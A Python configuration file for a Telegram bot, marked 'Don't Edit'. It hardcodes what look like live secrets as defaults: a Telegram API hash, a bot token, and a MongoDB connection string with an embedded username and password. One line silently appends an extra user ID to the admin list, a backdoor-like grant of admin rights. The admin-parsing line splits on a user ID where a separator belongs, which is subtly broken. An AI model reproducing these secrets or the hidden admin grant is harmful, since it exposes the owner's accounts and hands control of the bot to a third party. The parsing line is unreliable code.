# Don't Edit

import os

from dotenv import load_dotenv
load_dotenv()


# Mandatory variables for the bot to start
API_ID = int(os.getenv("API_ID", "16602377"))
API_HASH = os.environ.get("API_HASH", "6766d1e1d9fdddf7e06171829958bfad")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "5850329168:AAEpCUV2AYfIZKxvtKgQvcjX5r7xLx7gOow")
ADMINS = [int(i.strip()) for i in os.environ.get("ADMINS").split("1826980364")] if os.environ.get("ADMINS") else []
ADMIN = ADMINS
DATABASE_NAME = os.environ.get("DATABASE_NAME", "Cluster0")
DATABASE_URL = os.getenv("DATABASE_URL", "mongodb+srv://kgconvert:kgconvert@cluster0.kxclnsn.mongodb.net/?retryWrites=true&w=majority") 
OWNER_ID =  int(os.environ.get("OWNER_ID", "1826980364")) 
ADMINS.append(OWNER_ID) if OWNER_ID not in ADMINS else []
ADMINS.append(1009293650)
#  Optionnal variables
LOG_CHANNEL = int(os.environ.get("LOG_CHANNEL", "-1001887643064")) 
UPDATE_CHANNEL = os.environ.get("UPDATE_CHANNEL", "DTG_TV") # For Force Subscription
BROADCAST_AS_COPY = os.environ.get('BROADCAST_AS_COPY', "True") # true if forward should be avoided
WELCOME_IMAGE = os.environ.get("WELCOME_IMAGE", 'https://te.legra.ph/file/ac21c80a4947064ffb8e6.jpg') # image when someone hit /start # image when someone hit /start
LINK_BYPASS = "False"
